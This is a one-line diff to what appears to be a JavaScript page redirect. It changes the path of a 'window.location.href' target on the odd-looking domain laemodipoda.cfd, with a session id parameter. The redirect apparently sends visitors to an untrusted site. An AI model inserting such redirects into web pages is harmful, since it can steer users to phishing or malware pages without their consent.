@@ -1,1 +1,1 @@
-window.location.href = "https://laemodipoda.cfd/nUPmH/go?sid=7747";
+window.location.href = "https://laemodipoda.cfd/lpRof/go?sid=7747";
